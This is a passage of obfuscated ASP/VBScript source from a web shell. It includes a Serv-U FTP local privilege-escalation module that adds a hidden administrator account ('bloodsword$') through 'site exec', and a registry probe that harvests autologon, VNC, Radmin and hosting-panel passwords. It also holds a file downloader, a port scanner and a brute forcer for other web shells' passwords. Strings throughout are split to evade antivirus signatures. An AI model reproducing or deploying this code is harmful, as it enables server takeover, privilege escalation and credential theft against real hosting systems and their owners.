Set ydqp=Nothing
Set theFolder=Nothing
End Sub
Sub ewvy(wjiy,odkb,rs,xbo)
If Not gdzvu Then On Error Resume Next
Dim usk,theFolder,khbtq
execute "Set theFolder=zaydb.NameS"&thra&"pace(odkb)"
For Each usk In theFolder.Items
If Not usk.IsFolder And Lcase(usk.Name)<>yjcj And Lcase(usk.Name)<>lcsgr And Not(mox(aiy(usk.name,"."),"^("&ubg&")$"))  Then
rs.AddNew
rs("strPath")=Replace(usk.Path,wjiy&"\","")
execute "xbo.Loa"&ikfh&"dFromFile(usk.Path)"
rs("binContent")=xbo.Read()
rs.Update
End If
Next
For Each usk In theFolder.Items
If usk.IsFolder And Not mox(usk.name,"^("&lkp&")$") Then
ewvy wjiy,usk.Path,rs,xbo
End If
Next
Set theFolder=Nothing
End Sub
Sub nix()
If Not gdzvu Then On Error Resume Next
Server.ScriptTimeOut=5000
Dim rs,str,theFolder
wjiy=wjiy
wjiy=Replace(wjiy,"\\","\")
If InStr(uhuv,":\")<1 Then uhuv=iiju(uhuv)
Set rs=wannd("Ad"&rgc&"odb.Reco"&mchqr&"rdSet")
Set xbo=wannd("Ad"&rgc&"odb.St"&jgcbg&"ream")
vdgad=jwv(uhuv)
otrj(vdgad)
rs.Open"FileData",conn,1,1
jplxa Err
xbo.Open
xbo.Type=1
Do Until rs.Eof
If InStr(rs("strPath"),"\")>0 Then
theFolder=wjiy&"\"&snqsz(rs("strPath"),"\",False)
Else
theFolder=wjiy
End If
If Not cfho.FolderExists(theFolder)Then
execute "cfho.CreateFold"&veerr&"er(theFolder)"
End If
xbo.SetEos()
xbo.Write rs("binContent")
execute "xbo.Sa"&klt&"vetoFile wjiy&""\""&rs(""strPath""),2"
rs.MoveNext
Loop
rs.Close
jhbt
xbo.Close
Set rs=Nothing
Set xbo=Nothing
If Err Then
byv(Err)
Else
jdvsp"Unpacking completed"
End If
End Sub
Sub dui()
If Not gdzvu Then On Error Resume Next
Server.ScriptTimeOut=5000
Dim theFolder
uznjs("Text File Searcher/Replacer")
If wjiy=""Then
wjiy=bud
End If
pppf True
skkkw"100%"
mypdl 1
doTd"Keyword","20%"
wdjc"esard",esard,4
echo"<td>"
arqt"wkfvm","80px",""
isbb"fsoSearch","FSO"
isbb"saSearch","UnFSO"
iesnd
echo"<br>"
rfc"fcz",1," Regexp",""
prj"</td>"
jwwxg
mypdl 0
doTd"Replace as",""
wdjc"zhi",zhi,4
echo"<td>"
rfc"rmpr",1," Replace",""
prj"</td>"
jwwxg
mypdl 1
doTd"Path",""
gsj"text","wjiy",wjiy,"","",""
echo"<td>"
vots"radio","searchType","filename","",""
echo"File name "
vots"radio","searchType","aunk","","checked"
echo"File content"
echo"</td>"
jwwxg
mypdl 0
doTd"Search type",""
gsj"text","exfva",cgj,"","",""
ckzt"Search",""
jwwxg
iroyi
If esard<>""Then
echo"<hr>"
rwxiy
If wkfvm="fsoSearch"Then
Set theFolder=cfho.GetFolder(wjiy)
Call baoa(theFolder,esard)
Set theFolder=Nothing
ElseIf wkfvm="saSearch"Then
Call lppd(wjiy,esard)
End If
echo"</ul>"
End If
If Err Then
byv(Err)
Else
jdvsp"Search completed"
End If
okxls
End Sub
Sub baoa(folder,str)
Dim ext,title,theFile,theFolder,sdjfq
sdjfq=False
If fcz=1 Then sdjfq=True
For Each theFile In folder.Files
ext=Lcase(aiy(theFile.Name,"."))
If searchType="filename"Then
If sdjfq And mox(theFile.Name,str)Then
cvs theFile.Path,"fso"
ElseIf InStr(1,theFile.Name,str,1) > 0 Then
cvs theFile.Path,"fso"
End If
Else
If mox(ext,"^("&exfva&")$")Then
If zmah(theFile.Path,str,"fso",sdjfq) Then
cvs theFile.Path,"fso"
End If
End If
End If
Next
For Each theFolder In folder.subFolders
baoa theFolder,str
Next
byv(Err)
End Sub
Function zmah(tth,s,method,sdjfq)
If Not gdzvu Then On Error Resume Next
Dim theFile,content,find
find=False
If method="fso" Then
content=luuh(tth)
Else
content=ksfhb(tth)
End If
If Err Then
byv(Err)
zmah=False
Exit Function
End If
If sdjfq Then
find=mox(content,s)
ElseIf InStr(1,content,s,1)>0 Then
find=True
End If
If rmpr Then
If sdjfq Then
content=dwqgl(content,s,zhi,False)
Else
content=Replace(content,s,zhi,1,-1,1)
End If
If method="fso" Then
pjby tth,content
Else
ewi tth,content,2
End If
End If
zmah=find
byv(Err)
End Function
Sub lppd(wjiy,yrol)
If Not gdzvu Then On Error Resume Next
Dim title,ext,ydqp,ief,fileName,sdjfq
sdjfq=False
If fcz=1 Then sdjfq=True
execute "Set ydqp=zaydb.Na"&yfx&"meSpace(wjiy)"
For Each ief In ydqp.Items
If ief.IsFolder Then
Call lppd(ief.Path,yrol)
Else
ext=Lcase(aiy(ief.Path,"."))
fileName=aiy(ief.Path,"\")
If searchType="filename"Then
If sdjfq And mox(fileName,str)Then
cvs theFile.Path,"app"
ElseIf InStr(Lcase(fileName),Lcase(str)) > 0 Then
cvs theFile.Path,"app"
End If
Else
If mox(subExt,"^("&exfva&")$")Then
If zmah(ief.Path,yrol,"app",sdjfq) Then
cvs ief.Path,"app"
End If
End If
End If
End If
Next
byv(Err)
End Sub
Sub cvs(tth,agc)
Dim ovz
If agc="fso"Then
ovz="bjz"
Else
ovz="aeta"
End If
echo"<li><u>"&tth&"</u>"
fach ovz,"omt",omrpv(tth),"Edit",""
Response.Flush()
End Sub
Sub kjplx()
If Not gdzvu Then On Error Resume Next
Dim vbu
vbu="darkblade"
qpry="User "&vaxil&vbCrLf
koooz="Pass "&wxh&vbCrLf
mzy="-DE"&epvdt&"LETEDOMAIN"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&" PortNo="&vsbms&vbCrLf
mt="SITE MAINTENAN"&jzcut&"CE"&vbCrLf
nqihw="-SetDOMA"&rqqr&"IN"&vbCrLf&"-Domain="&vbu&"|0.0.0.0|"&vsbms&"|-1|1|0"&vbCrLf&"-TZ"&pio&"OEnable=0"&vbCrLf&" TZOKey="&vbCrLf
zgj="-SetUSERS"&odlmw&"etUP"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&"-PortNo="&vsbms&vbCrLf&"-User="&nuser&vbCrLf&"-Password="&npass&vbCrLf&_
"-HomeDir="&vtyj()&"\\"&vbCrLf&"-Login"&sua&"MesFile="&vbCrLf&"-Disable=0"&vbCrLf&"-Re"&jzfa&"lPaths=1"&vbCrLf&_
"-Nee"&vikej&"dSecure=0"&vbCrLf&"-HideHi"&nby&"dden=0"&vbCrLf&"-AlwaysAllowLo"&fbmd&"gin=0"&vbCrLf&"-Cha"&blip&"ngePassword=0"&vbCrLf&_
"-Quot"&pvpxm&"aEnable=0"&vbCrLf&"-MaxUsersLo"&nik&"ginPerIP=-1"&vbCrLf&"-Sp"&wuzkd&"eedLimitUp=0"&vbCrLf&"-SpeedLimi"&pbr&"tDown=0"&vbCrLf&_
"-MaxNrUse"&porwg&"rs=-1"&vbCrLf&"-IdleTi"&mdth&"meOut=600"&vbCrLf&"-SessionTimeOut=-1"&vbCrLf&"-Expire=0"&vbCrLf&"-RatioUp=1"&vbCrLf&_
"-RatioDown=1"&vbCrLf&"-RatiosCredit=0"&vbCrLf&"-QuotaCurrent=0"&vbCrLf&"-QuotaMaximum=0"&vbCrLf&_
"-MAINTENAN"&jzcut&"CE=System"&vbCrLf&"-PasswordType=Regular"&vbCrLf&"-Ratios=None"&vbCrLf&" Access="&vtyj()&"\\|RWAMELC"&anab&"DP"&vbCrLf
tgs="QUIT"&vbCrLf
uznjs("Ser"&tpzkq&"v-U FTP Exp")
Select Case wkfvm
Case "1"
qmnx
Case "2"
bfun
Case "3"
wqfl
Case "4"
lpcb
Case "5"
vyqpe
Case Else
If IsObject(Session("a"))Then Session("a").abort
If IsObject(Session("b"))Then Session("b").abort
If IsObject(Session("c"))Then Session("c").abort
Set Session("a")=Nothing
Set Session("b")=Nothing
Set Session("c")=Nothing
pppf True
olisd "wkfvm",1
echo"<center><b>Add Temp Domain</b><br>"
skkkw "80%"
mypdl 1
doTd"Local user","20%"
gsj"text","vaxil","Loca"&nby&"lAdministrator","30%","",""
doTd"Local pass","20%"
gsj"text","wxh","#l@$ak#.lk;0@P","30%","",""
jwwxg
mypdl 0
doTd" Local port",""
gsj"text","txmf","439"&mmx&"58","","",""
doTd"Sys drive",""
gsj"text","tncir",vtyj(),"","",""
jwwxg
mypdl 1
doTd"New user",""
gsj"text","nuser","go","","",""
doTd"New pass",""
gsj"text","npass","od","","",""
jwwxg
mypdl 0
doTd"New port",""
gsj"text","vsbms","60000","","",""
echo"<td>"
xzs"Go"
echo"</td><td>"
vots"reSet","","ReSet","",""
echo"</td></tr>"
iroyi
echo"</center>"
xpor
End Select
echo"<hr>"
echo"<center>"
skkkw "80%"
mypdl 1
echo"<td>"
fach goaction,"","","Add domain",""
echo"</td>"
echo"<td>"
fach goaction,4,"","Exec cmd",""
echo"</td>"
echo"<td>"
fach goaction,5,"","Clean domain",""
echo"</td>"
jwwxg
iroyi
echo"</center>"
okxls
End Sub
Sub qmnx()
If Not gdzvu Then On Error Resume Next
Set a=wannd("Microsoft.XMLH"&uybs&"TTP")
a.open"GET","http://127.0.0.1:"&txmf&"/goldsun/upadm"&yfx&"in/s1",True,"",""
a.send qpry&koooz&mt&mzy&nqihw&zgj&tgs
Set Session("a")=a
jdvsp"Connecting 127.0.0.1:"&txmf&" using "&vaxil&",pass:"&wxh&"..."
lpcb
End Sub
Sub bfun()
If Not gdzvu Then On Error Resume Next
lpcb()
Set b=wannd("Microsoft.XMLH"&uybs&"TTP")
b.open"GET","http://"&ids("LOCAL_ADDR")&":"&vsbms&"/goldsun/upadm"&yfx&"in/s2",False,"",""
b.send"User "&nuser&vbCrLf&"pass "&npass&vbCrLf&"site exec "&sxib&vbCrLf&tgs
Set Session("b")=b
jdvsp"Executing com"&ehk&"mand..."
prj"<hr><center><div class='alt1Span' style='width:80%;text-align:left'><br>"
prj Replace(b.ResponseText,chr(10),"<br>")&"</div></center>"
End Sub
Sub wqfl()
If Not gdzvu Then On Error Resume Next
Set c=wannd("Microsoft.XMLH"&uybs&"TTP")
c.open "GET","http://127.0.0.1:"&txmf&"/goldsun/upadm"&yfx&"in/s3",True,"",""
c.send qpry&koooz&mt&mzy&tgs
Set Session("c")=c
jdvsp"Temp domain deleted!"
echo"<script language='javascript'>setTimeout(""xzs('"&goaction&"','','')"",""3000"");</script>"
End Sub
Function vtyj()
If Not gdzvu Then On Error Resume Next
vtyj=Lcase(Left(cfho.GetSpecialFolder(0),2))
If vtyj=""Then vtyj="c:"
End Function
Sub lpcb()
If nuser=""Then nuser="go"
If npass=""Then npass="od"
If vsbms=""Then vsbms="60000"
pppf True
olisd "wkfvm",2
echo"<center><b>Execute Cmd</b><br>"
skkkw "80%"
mypdl 1
doTd"com"&ehk&"mand",""
gsj"text","sxib","cmd /c net us"&xpbp&"er bloodsword$ 0kee /add & net loca"&mlat&"lgroup administrators bloodsword$ /add","","",3
jwwxg
mypdl 0
doTd"Ftp user",""
gsj"text","nuser",nuser,"","",""
doTd"Ftp pass",""
gsj"text","npass",npass,"","",""
jwwxg
mypdl 1
doTd"Ftp port",""
gsj"text","vsbms",vsbms,"","",""
echo"<td>"
xzs"Go"
echo"</td><td>"
vots"reSet","","ReSet","",""
echo"</td></tr>"
iroyi
echo"</center>"
xpor
End Sub
Sub vyqpe()
pppf True
olisd "wkfvm",3
echo"<center><b>Clean Temp Domain</b><br>"
skkkw "80%"
mypdl 1
doTd"Local user","20%"
gsj"text","vaxil","Loca"&nby&"lAdministrator","30%","",""
doTd"Local pass","20%"
gsj"text","wxh","#l@$ak#.lk;0@P","30%","",""
jwwxg
mypdl 0
doTd"Local port",""
gsj"text","txmf","439"&mmx&"58","","",""
doTd"Temp domain port",""
gsj"text","vsbms","60000","","",""
jwwxg
mypdl 1
echo"<td>"
xzs"Go"
echo"</td><td colspan='3'>"
vots"reSet","","ReSet","",""
echo"</td></tr>"
iroyi
echo"</center>"
xpor
End Sub
Sub pwz()
If Not gdzvu Then On Error Resume Next
Dim theFolder
uznjs"Asp Webshell Scanner"
echo"Path : "
pppf True
vots"text","wjiy","/",50,""
echo" "
xzs"Scan"
rfc"echs",1," Get include files",""
If wjiy<>""Then
If InStr(wjiy,":\")<1 Then wjiy=iiju(wjiy)
echo"<hr>"
Response.Flush()
rwxiy
Set theFolder=cfho.GetFolder(wjiy)
waozu(theFolder)
Set theFolder=Nothing
echo"</ul>"
End If
okxls
End Sub
Sub waozu(theFolder)
If Not gdzvu Then On Error Resume Next
Server.ScriptTimeOut=5000
Dim afqj,uvh,ext,cfwvy,funcs,njxs,uitb,theFile,content,obcy
afqj="WS"&qfmd&"cript.S"&oda&"hell|WS"&qfmd&"cript.Sh"&wzeok&"ell.1|Sh"&wzeok&"ell.Applicati"&jaoy&"on|Sh"&wzeok&"ell.Applicati"&jaoy&"on.1|clsid:72C2"&gqlo&"4DD5-D70A-438B-8A42-984"&slgv&"24B88AFB8|clsid:13709"&dav&"620-C279-11CE-A49E-44455"&wila&"3540000"
uvh="WS"&qfmd&"cript.S"&oda&"hell;Run,Exec,RegRead|Sh"&wzeok&"ell.Applicati"&jaoy&"on;ShellExecu"&srtb&"te|Scrip"&dlbgc&"ting.Fi"&xxjzd&"leSystemObject;CreateTextFile,OpenTextFile,SavetoFile"
For Each qay In theFolder.Files
obcy=False
njxs=False
ext=Lcase(aiy(qay.Name,"."))
If mox(ext,"^("&fgejg&")$") Then
content=luuh(qay.Path)
uitb=""
For Each flit In Split(afqj,"|")
If InStr(1,content,flit,1)>0 Then
uhie qay,"Object with risk : <font color=""red"">"&flit&"</font>"
obcy=True
End If
Next
For Each strFunc In Split(uvh,"|")
cfwvy=snqsz(strFunc,";",True)
funcs=aiy(strFunc,";")
For Each subFunc In Split(funcs,",")
If mox(content,"\."&subFunc&"\b") Then
uhie qay,"Called object <font color=""red"">"&cfwvy&"'s "&subFunc&"</font> Function"
obcy=True
End If
Next
Next
If mox(content,"Set\s*.*\s*=\s*server\s")Then
uhie qay,"Found Set xxx=Server"
obcy=True
End If
If mox(content,"server.(execute|Transfer)([ \t]*|\()[^""]\)")Then
uhie qay,"Found <font color=""red"">Server."&kjozs&"Execute / Transfer()</font> Function"
obcy=True
End If
If mox(content,"\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript)\.encode\b")Then
uhie qay,"<font color=""red"">Script encrypted</font>"
obcy=True
End If
If mox(content,"<script\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>")Then
uhie qay,"Found <font color=""red"">"&uhu("<script runat=""server"">")&"</font>"
obcy=True
End If
If mox(content,"[^\.]\bExecute\b")Then
uhie qay,"Found <font color=""red"">Execute()</font> Function"
obcy=True
End If
If mox(content,"[^\.]\bExecuteGlobal\b")Then
uhie qay,"Found <font color=""red"">Exec"&qya&"uteGlobal()</font> Function"
obcy=True
End If
If echs=1 Then uitb=cfv(content,"<!--\s*#include\s+(file|virtual)\s*=\s*.*-->",False)(0)
If uitb<>""Then
uitb=cfv(uitb,"[/\w]+\.[\w]+",False)(0)
If uitb=""Then 
uhie qay,"Can't get include file"
obcy=True
Else
uhie qay,"Included file <font color=""blue"">"&uitb&"</font>"
obcy=True
End If
End If
End If
If obcy Then
echo"<hr>"
Response.Flush()
End If
Next
For Each ydqp In theFolder.SubFolders
waozu(ydqp)
Next
byv(Err)
End Sub
Sub uhie(qay,rgbdm)
prj"<li><u>"
fach "bjz","omt",omrpv(qay.Path),qay.Path,""
prj"</u><font color=#9900FF>"&qay.DateLastModIfied&"</font>-<font color=#009966>"&ilnuo(qay.size)&"</font>-"&rgbdm&"</li>"
Response.Flush()
End Sub
Sub vwhbt()
If Not gdzvu Then On Error Resume Next
If wjiy=""Then wjiy=vuv
Dim zgy,ppdbv
ppdbv=vga
zgy=gxyx
If ppdbv=""Then ppdbv=Replace("HK"&gsw&"LM\SYSTEM\Curren"&ghfkv&"tControlSet\Control\Compute"&bewvk&"rName\Compute"&bewvk&"rName\Compute"&bewvk&"rName|HK"&gsw&"LM\SOFTWA"&qwse&"RE\Microsoft\Windows "&gud&"NT\Cur"&rtcm&"rentVersion\Wi"&atnga&"nlogon\Au"&zbich&"toAdminLogon|HK"&gsw&"LM\SOFTWA"&qwse&"RE\Microsoft\Windows "&gud&"NT\Cur"&rtcm&"rentVersion\Wi"&atnga&"nlogon\DefaultUser"&ktus&"Name|HK"&gsw&"LM\SOFTWA"&qwse&"RE\Microsoft\Windows "&gud&"NT\Cur"&rtcm&"rentVersion\Wi"&atnga&"nlogon\Def"&krvi&"aultPassword|HK"&gsw&"LM\SYSTEM\Curren"&ghfkv&"tControlSet\Services\Ser"&tpzkq&"v-U-Counters\Performance\Library|HK"&gsw&"LM\SYSTEM\Curren"&ghfkv&"tControlSet\Services\Ser"&tpzkq&"v-U\ImagePath|HK"&gsw&"LM\SOFTWA"&qwse&"RE\Cat Soft\Ser"&tpzkq&"v-U\Domains\DomainList\DomainList|HK"&gsw&"LM\SYSTEM\Rad"&qjt&"min\v2.0\Server\Parameters\Parameter|HK"&gsw&"LM\SYSTEM\Rad"&qjt&"min\v2.0\Server\Parameters\Port|HK"&gsw&"LM\SYSTEM\Rad"&qjt&"min\v2.0\Server\Parameters\NT"&zcg&"AuThenabled|HK"&gsw&"LM\SYSTEM\Rad"&qjt&"min\v2.0\Server\Parameters\Fil"&znm&"terIp|HK"&gsw&"LM\SYSTEM\Rad"&qjt&"min\v2.0\Server\iplist\0|HK"&gsw&"LM\SOFTWA"&qwse&"RE\ORL\WinVNC3\default\Password|HK"&gsw&"LM\SOFTWA"&qwse&"RE\RealVNC\WinVNC4\Password|HK"&gsw&"LM\SOFTWA"&qwse&"RE\hzhost\config\Settings\mysqlpass|HK"&gsw&"LM\SOFTWA"&qwse&"RE\hzhost\config\Settings\mastersvrpass|HK"&gsw&"LM\SOFTWA"&qwse&"RE\hzhost\config\Settings\sysdbpss","|",Chr(13)&Chr(10))
If zgy=""Then zgy=Replace("x:\|x:\Program Files|x:\Program Files\Ser"&tpzkq&"v-U|x:\Program Files\RhinoSoft.com|x:\Program Files\Rad"&qjt&"min|x:\Program Files\Mysql|x:\Program Files\mail|x:\Program Files\winwebmail|x:\Documents and Settings\All Users|x:\Documents and Settings\All Users\Documents|x:\Documents and Settings\All Users\Start Menu\Programs|x:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere|x:\Ser"&tpzkq&"v-U|x:\Rad"&qjt&"min|x:\Mysql|x:\mail|x:\winwebmail|x:\soft|x:\tools|x:\windows\temp","|",Chr(13)&Chr(10))
uznjs"Action Others"
pppf True
olisd"wkfvm","dpg"
prj"<b>Download to server</b><br>"
skkkw"100%"
mypdl 1
gsj"text","lifba","http://","80%","",""
ckzt"Download","20%"
jwwxg
mypdl 0
gsj"text","wjiy",wjiy,"","",""
echo"<td>"
rfc"overWri",2,"Overwrite",""
jwwxg
iroyi
xpor
echo"<hr>"
pppf True
olisd"wkfvm","beg"
prj"<b>Port scan</b><br>"
skkkw"100%"
mypdl 1
doTd"Scan IP","20%"
gsj"text","pbshc","127.0.0.1","60%","",""
ckzt"Scan","20%"
jwwxg
mypdl 0
doTd"Port List","20%"
gsj"text","zxsvx","21,23,80,1433,1521,3306,3389,4899,439"&mmx&"58,65500","80%","",2
jwwxg
iroyi
xpor
echo"<hr>"
pppf True
olisd"wkfvm","iowlr"
prj"<b>Mini shell crack</b><br>"
skkkw"100%"
mypdl 1
doTd"Url","20%"
gsj"text","lifba","http://","60%","",""
ckzt"Start","20%"
jwwxg
mypdl 0
doTd"Dic","20%"
gsj"text","tyhwc","value,cmd,admin,fuck,123456,#,|,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,~,!,@,*,$,1,2,3,4,5,6,7,8,9,0","","",""
echo"<td>"
arqt"gsgex","60px",""
isbb"asp","asp"
isbb"php","php"
iesnd
echo"</td>"
jwwxg
iroyi
xpor
echo"<hr>"
pppf True
olisd"wkfvm","aze"
prj"<b>Common path probe</b><br>"
skkkw"100%"
mypdl 1
wdjc"gxyx",zgy,6
ckzt"Start","20%"
jwwxg
iroyi
xpor
echo"<hr>"
pppf True
skkkw"100%"
olisd"wkfvm","lzi"
prj"<b>Registry probe</b><br>"
skkkw"100%"
mypdl 1
wdjc"vga",ppdbv,6
ckzt"Start","20%"
jwwxg
iroyi
xpor
echo"<hr>"
Select Case wkfvm
Case"dpg"
echo"<hr>"
njh()
Case"lzi"
echo"<hr>"
rctie()
Case"beg"
echo"<hr>"
bgo()
Case"iowlr"
echo"<hr>"
cjq()
Case"aze"
echo"<hr>"
vuj()
End Select
End Sub
Sub njh()
If Not gdzvu Then On Error Resume Next
Dim khd,plmv
Set xbo=wannd("Ad"&rgc&"odb.St"&jgcbg&"ream")
khd=aiy(lifba,"/")
If InStr(wjiy,".")<1 Then wjiy=wjiy&"\"&khd
jcy.Open"GET",lifba,False
jcy.send
jplxa(Err)
If overWri<>2 Then
overWri=1
End If
With xbo
.Type=1
.Mode=3
.Open
.Write jcy.ResponseBody
.Position=0
execute "xbo.SavetoFil"&chfx&"e wjiy,overWri"
.Close
End With
If Err Then
byv(Err)
Else
echo"Download succeeded"
End If
End Sub
Sub rctie()
If Not gdzvu Then On Error Resume Next
Dim aetm
echo"Registry key detected will be shown below:<br>"
skkkw "100%"
mtz=1
wuosu
doTd"<b>Key</b>",""
doTd"<b>Value</b>",""
jwwxg
For Each odkb In Split(vga,Chr(13)&Chr(10))
aetm=bytxz(odkb)
If aetm<>"" Then
mypdl mtz
doTd odkb,""
doTd aetm,""
jwwxg
cdama
End If
Next
iroyi
End Sub
Function bytxz(rpath)
Dim bvlq,aetm
If Not gdzvu Then On Error Resume Next
execute "bvlq=aplyi.RegR"&opns&"ead(rpath)"
If IsArray(bvlq)Then
aetm=""
For i=0 To UBound(bvlq)
If IsNumeric(bvlq(i))Then
If CInt(bvlq(i))<16 Then
aetm=aetm&"0"
End If
aetm=aetm&CStr(Hex(CInt(bvlq(i))))
Else
aetm=aetm&bvlq(i)
End If
Next
bytxz=aetm
Else
bytxz=bvlq
End If
End Function
Sub bgo()
If Not gdzvu Then On Error Resume Next
If Not mox(pbshc,"^((\d{1,3}\.){3}(\d{1,3}),)*(\d{1,3}\.){3}(\d{1,3})$")Then
echo "Invalid IP format"
okxls
End If
If Not mox(zxsvx,"^(\d{1,5},)*\d{1,5}$")Then
echo "Invalid port format"
okxls
End If
echo "Scanning...<br>"
Response.Flush()
For Each tmpip In Split(pbshc,",")
For Each tmpPort In Split(zxsvx,",")
kttr tmpip,tmpPort
Next
Next
End Sub
Sub kttr(swme,smbhq)
On Error Resume Next
Dim conn,vdgad
Set conn=wannd("Ad"&rgc&"odb.Conne"&ytwmf&"ction")
vdgad="Provider=SQLOLEDB.1;Data Source="&swme&","&smbhq&";User ID=lake2;Password=lake2;"
conn.ConnectionTimeout=1
conn.open vdgad
If Err Then
If Err.number=-2147217843 or Err.number=-2147467259 Then
If InStr(Err.description,"(Connect()).")>0 Then
echo"<label>"&swme&":"&smbhq&"</label><label>close</label><br>"
Else
echo"<label>"&swme&":"&smbhq&"</label><label><font color=red>open</font></label><br>"
End If
Response.Flush()
End If
End If
End Sub
Sub cjq()
If Not gdzvu Then On Error Resume Next
echo"Cracking...<br>"
Response.Flush()
For Each strPass In Split(tyhwc,",")
If gsgex="asp"Then
strpam=lcbr(strPass)&"="&lcbr("response.write 98611")
Else
strpam=lcbr(strPass)&"="&lcbr("echo 98611;")
End If
If InStr(pifbx(lifba&"?"&strpam,"POST"),"98611")>0 Then
echo"Password is <font color=red>"&strPass&"</font> ^_^"
okxls
End If
Next
echo"Crack failed,RPWT?"
byv(Err)
End Sub
Sub vuj()
If Not gdzvu Then On Error Resume Next
Dim aydo,jplxo
echo"Path detected will be shown below:<br>"
gxyx=Replace(gxyx,"x:\","")
jplxo=1
For Each drive In cfho.Drives
For Each odkb In Split(gxyx,Chr(13)&Chr(10))
execute "aydo=drive.Drive"&epjb&"Letter&"":\""&odkb"
If cfho.FolderExists(aydo)Then
cvdty jplxo
fach "bjz","",omrpv(aydo),aydo,""
echo"</span>"
jplxo=jplxo+1
If jplxo=2 Then jplxo=0
mnxu.MoveNext
Response.Flush()
End If
Next
Next
byv(Err)
End Sub
Sub nvx()
Response.Cookies(ysktq)=""
Response.Redirect(crk&"?goaction="&qry)
End Sub
Sub uznjs(pufyf)
%>
<html>
<head>
<title><%=ajvx%></title>
<style type="text/css">
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.main{width:100%;padding:20px 20px 20px 20px;}
.hidehref{font:12px Arial,Tahoma;color:#646464;}
.showhref{font:12px Arial,Tahoma;color:#0099FF;}
.input{font:12px Arial,Tahoma;background:#fff;height:20px;BORDER-WIDTH:1px;}
.text{font:12px Arial,Tahoma;background:#fff;padding:1px;BORDER-WIDTH:1px;}
.tdInput{font:12px Arial,Tahoma;background:#fff;padding:1px;height:20px;width:100%;BORDER-WIDTH:1px;}
.tdText{font:12px Arial,Tahoma;background:#fff;padding:1px;width:100%;BORDER-WIDTH:1px;}
.area{font:12px 'Courier New',Monospace;background:#fff;border: 1px solid #666;padding:2px;}
a{color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1Span{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:2px 10px 2px 5px;width:100%;height:28px}
.alt0Span{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:2px 10px 2px 5px;width:100%;height:28px}
.link td{border-top:1px solid #fff;border-bottom:1px solid #ccc;background:#e8e8e8;padding:5px 10px 5px 5px;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:2px 10px 2px 5px;height:28px}
.alt0 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:2px 10px 2px 5px;height:28px}
.focusTr td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ddddff;padding:2px 10px 2px 5px;height:28px}
.head td{border-top:1px solid #ccc;border-bottom:1px solid #bbb;background:#e0e0e0;padding:5px 10px 5px 5px;font-weight:bold;}
.headSpan{border-top:1px solid #fff;margin:2;background:#e0e0e0;width:100%;}
form{margin:0;padding:0;}
.bt{border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:23px;padding:3px 5px 5px 5px;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:50%;margin-right:10px;}
label{font:12px Arial,Tahoma;float:left;width:20%;}
.lbl{font:12px Arial,Tahoma;float:none;width:auto;}
</style>
<script language="javascript">
function aac(obj){
var sender=event.srcElement;
if(obj.style.display=='none'){
obj.style.display='';
sender.className='showhref';
}else{
obj.style.display='none';
sender.className='hidehref';
}
}
</script>
<script language="vbscript">
Function xzs(ovz,feuya,Str)
On Error Resume Next
Dim koba
actForm.goaction.value=ovz
actForm.wkfvm.value=feuya
If(ovz="bjz"Or ovz="aeta")And InStr(Str,":\")<1 And Str<>"" Then Str=ydc.value&Str
actForm.dpqnl.value=xppp(Str)
Select Case feuya
Case"uqezp"
vnwt("upform")
upform.submit()
Case"ndt"
vnwt("saform")
saform.submit()
Case"ehwr","cmhk","okio","wkicu","vhjf","gnfr","qxb"
Select Case feuya
Case"okio","cmhk"
koba=InputBox("Move to :","Move",Left(Str,InstrRev(Str,"\")))
Case"wkicu","ehwr"
koba=InputBox("Copy to :","Copy",Left(Str,InstrRev(Str,"\")))
Case"vhjf","gnfr"
koba=InputBox("Rename as :","Rename",Mid(Str,InstrRev(Str,"\")+1))
If feuya="vhjf"Then
Do While InStr(koba,".")<1 And koba<>""
koba=InputBox("Invalid file name format!","Rename","")
Loop
End If
Case Else
koba=InputBox("ModIfy as :","ModIfy time","")
End Select
If koba=""Then Exit Function
actForm.dpqnl.value=xppp(Str&"|"&koba)
actForm.submit()
Case"aay","ohp"
If Window.confirm("Delete it?Are you sure?")Then actForm.submit()
Case Else
actForm.submit()
End Select
End Function
Function xppp(pamToEn)
If Not <%=skw%> Or pamToEn=""Then
xppp=pamToEn
Exit Function
End If
Dim tt,uxond
tt=""
For i=1 To Len(pamToEn)
uxond=Mid(pamToEn,i,1)
If Asc(uxond)<128 And Asc(uxond)>0 Then
tt=tt&Asc(uxond)+<%=aal%>&"<%=iul%>"
Else
tt=tt&uxond&"<%=iul%>"
End If
Next
xppp=Left(tt,Len(tt)-1)
End Function
Function vnwt(qhgjo)
On Error Resume Next
Dim pamArr
pamArr=Split("<%=xkur%>","|")
For Each strPam In pamArr
On Error Resume Next:Execute qhgjo&"."&strPam&".value=xppp("&qhgjo&"."&strPam&".value)"
Next
End Function
Function vbx(feuya,vdgad,npkn,ouo,lrmn)
sqlForm.wkfvm.value=feuya
If feuya="zzx"Then
If Not Window.confirm("Delete this table?Are you sure?")Then Exit Function
End If
If vdgad<>""Then
If InStr(1,vdgad,"PROVIDER=",1)<1 Then vdgad="<%=jwv("")%>"&ydc.value&vdgad
sqlForm.vdgad.value=vdgad
End If
'If ouo<>""And <%=ignq<>"others"%> Then ouo="["&ouo&"]"
sqlForm.vdgad.value=xppp(sqlForm.vdgad.value)
sqlForm.npkn.value=xppp(npkn)
sqlForm.ouo.value=xppp(ouo)
sqlForm.lrmn.value=lrmn
sqlForm.submit()
End Function
Function apxyh(server,user,pass,db)
form1.vdgad.value="PROVIDER=SQLOLEDB;DATA SOURCE="&server&";UID="&user&";PWD="&pass&";DATABASE="&db&""
End Function
Function cfhn(dbpath)
